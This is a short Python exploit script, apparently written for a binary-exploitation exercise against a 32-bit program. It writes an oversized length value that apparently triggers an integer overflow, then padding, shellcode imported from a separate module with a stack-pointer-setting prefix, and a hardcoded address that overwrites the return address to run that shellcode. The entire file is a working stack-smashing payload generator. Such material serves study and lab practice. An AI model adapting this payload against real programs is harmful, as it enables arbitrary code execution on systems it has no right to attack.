#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

'''
Eax have size: 0x0804893a
Eax have actual change(4s+16): 0x08048959
Actual read: 0x080488d0
Done with OF: 0x080488e6
'''
addr = lambda x: pack('<I',x)

pad = 16+4*7+4*0
align = 1
size = (0xffffffff)//4+0
# shell_addr=0xbbbbbbbb
shell_addr = 0xfffed6ef

shellcode=b"\xBC\xE0\xD6\xFE\xFF"+shellcode

sys.stdout.buffer.write(addr(size))
# sys.stdout.buffer.write(b'\xAA'*pad)
sys.stdout.buffer.write(b'\xAA'*(pad-len(shellcode)-align))
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\xAA'*align)
sys.stdout.buffer.write(addr(shell_addr))
